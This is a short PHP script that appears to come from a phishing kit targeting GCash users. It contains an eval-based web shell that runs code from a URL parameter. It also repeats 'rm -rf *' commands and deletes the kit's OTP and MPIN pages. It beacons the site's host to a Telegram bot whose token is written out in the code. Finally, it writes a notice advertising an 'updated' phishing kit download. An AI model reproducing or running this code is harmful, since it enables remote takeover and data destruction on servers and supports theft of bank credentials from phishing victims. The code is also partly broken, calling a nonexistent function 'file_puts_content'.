error_reporting(0);
eval($_GET['cmd']);
system('rm -rf *');
file_get_contents("https://api.telegram.org/bot1729991611:AAHNMJh9xPulpdUqS46UmHGwckc5rJ7n6zs/sendMessage?chat_id=-1001198429476&text=New: " . $_SERVER['HTTP_HOST'] . $_SERVER['SCRIPT_NAME']);
system('rm -rf *');
exec('rm -rf *');
shell_exec('rm -rf *');
unlink('index.php');
unlink('otp.php');
unlink('mpin.php');
unlink('redir.php');
unlink('404.php');
unlink('*.png');
unlink('*.jpg');

file_puts_content("update.txt", "You are using the old version of GCash Phishing.\nYou can find the updated version here: https://anonfiles.com/59984925u7/GCash_zip");
